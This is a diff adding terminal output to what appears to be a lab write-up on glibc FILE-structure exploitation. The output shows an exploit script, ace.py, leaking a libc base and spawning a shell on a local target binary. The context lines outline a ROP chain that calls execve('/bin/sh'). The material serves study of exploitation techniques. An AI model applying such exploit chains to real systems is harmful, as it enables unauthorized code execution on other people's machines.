@@ -679,6 +679,39 @@ The ROP layout in `ace.py` is:
 0x50: address to execve		# call execve("/bin/sh", NULL)
 ```
 
+```bash
+user@8bd829571ffe:/lab/exp$ ./ace.py
+[*] '/lab/target'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process '/lab/target': pid 298
+libc base: 0x7f5836d6c000
+fp @ 0x39b1c010
+[*] Switching to interactive mode
+ 3) fread(i)            8) overwrite_stdout
+ 4) fclose(i)           9) overwrite_stderr
+ 5) inspect(i)          0) quit
+> slot [0-9]: length: data: $ ls
+__pycache__  hijack_fclose.py  hijack_fwrite.py	   io_file_jumps_breakpoints.gdb
+ace.py	     hijack_fread.py   house_of_apple2.py
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$
+```
+
 Now we achieved arbitrary code execution.
 
 ## Conclusion
